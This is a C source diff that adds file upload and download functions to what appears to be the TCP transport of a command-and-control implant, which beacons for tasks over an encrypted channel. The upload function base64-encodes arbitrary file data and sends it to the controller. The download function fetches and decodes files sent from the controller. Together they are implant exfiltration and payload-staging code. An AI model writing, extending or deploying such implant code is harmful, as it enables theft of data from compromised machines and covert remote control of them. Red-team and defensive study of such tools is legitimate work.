@@ -506,6 +506,70 @@ AgentTask* transport_tcp_beacon(int *count) {
     return tasks;
 }
 
+void transport_tcp_upload_file(long long task_id, const char *filename,
+                               const uint8_t *data, size_t data_len) {
+    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;
+
+    char *b64_data = b64_encode(data, data_len);
+    if (!b64_data) return;
+
+    char *esc_filename = tcp_json_escape(filename);
+    if (!esc_filename) { free(b64_data); return; }
+
+    size_t payload_sz = strlen(esc_filename) + strlen(b64_data) + 64;
+    char *payload = (char*)malloc(payload_sz);
+    if (!payload) { free(b64_data); free(esc_filename); return; }
+    snprintf(payload, payload_sz,
+        "{\"task_id\":%lld,\"filename\":\"%s\",\"data\":\"%s\"}",
+        task_id, esc_filename, b64_data);
+    free(b64_data);
+    free(esc_filename);
+
+    if (!tcp_send_enc("upload", payload)) {
+        free(payload);
+        tcp_reset();
+        return;
+    }
+    free(payload);
+
+    if (!tcp_recv_ack()) tcp_reset();
+}
+
+uint8_t* transport_tcp_download_file(const char *filename, size_t *out_len) {
+    *out_len = 0;
+    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;
+
+    char *esc_filename = tcp_json_escape(filename);
+    if (!esc_filename) return NULL;
+
+    size_t payload_sz = strlen(esc_filename) + 16;
+    char *payload = (char*)malloc(payload_sz);
+    if (!payload) { free(esc_filename); return NULL; }
+    snprintf(payload, payload_sz, "{\"filename\":\"%s\"}", esc_filename);
+    free(esc_filename);
+
+    if (!tcp_send_enc("download", payload)) {
+        free(payload);
+        tcp_reset();
+        return NULL;
+    }
+    free(payload);
+
+    char *resp_plain = tcp_recv_enc("dl_resp");
+    if (!resp_plain) {
+        tcp_reset();
+        return NULL;
+    }
+
+    char *b64 = agent_json_str_alloc(resp_plain, "data");
+    free(resp_plain);
+    if (!b64) return NULL;
+
+    uint8_t *out = b64_decode(b64, out_len);
+    free(b64);
+    return out;
+}
+
 void transport_tcp_send_result(long long task_id, const char *output,
                                 const char *error, int is_admin) {
     if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;
